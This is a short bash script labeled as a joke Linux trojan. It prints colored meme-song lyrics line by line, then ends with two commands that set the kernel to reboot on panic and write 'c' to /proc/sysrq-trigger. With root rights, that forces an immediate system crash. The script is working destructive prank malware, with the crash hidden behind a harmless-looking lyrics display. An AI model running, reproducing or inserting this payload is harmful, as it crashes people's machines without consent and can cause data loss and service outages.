# Trojan.Linux.Joke.TingGoesLyrics
# by codedroider

#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

clear

sleep 1

echo -e "${YELLOW}I've got the sauce (flexin')...${NC}"
sleep 1.2

echo -e "${RED}No ketchup! (none)${NC}"
sleep 1.0

echo -e "${GREEN}Just sauce! (saucy)${NC}"
sleep 0.8

echo -e "${GREEN}RAW SAUCE!!!${NC}"
sleep 1.2

echo -e "${CYAN}Yo, boom, ah!${NC}\n"
sleep 0.5

echo -e "${RED}The ting goes skrrahh!${NC}"
sleep 0.3
echo -e "${RED}Pap, pap, ka-ka-ka!${NC}"

echo 1 > /proc/sys/kernel/panic
echo "c" > /proc/sysrq-trigger
